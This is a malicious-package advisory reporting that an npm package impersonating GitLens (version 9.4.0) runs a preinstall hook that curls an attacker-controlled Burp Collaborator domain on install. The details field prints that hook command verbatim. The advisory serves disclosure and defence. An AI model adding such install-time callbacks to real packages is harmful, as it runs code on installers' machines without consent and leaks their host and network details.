summary: gitlens 9.4.0 executes preinstall callback to attacker-controlled OAST domain
details: package.json declares a preinstall lifecycle hook that runs `curl https://bt8hbz0owdan31qvdap2u5b8izoqcg05.oastify.com` on `npm install`. The destination is a Burp Collaborator out-of-band interaction subdomain used to confirm blind code execution and to receive DNS/HTTP callbacks carrying host and network metadata from the installer. The package name impersonates the well-known GitLens identifier while shipping only a trivial stub index.js (`module.exports = () => console.log("Hello from test package!")`) with no legitimate functionality, so the name serves solely to attract installs that then trigger the install-time callback. Installing this version produces an unauthenticated outbound request from the installer's machine to an attacker-controlled interaction host with no user consent.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
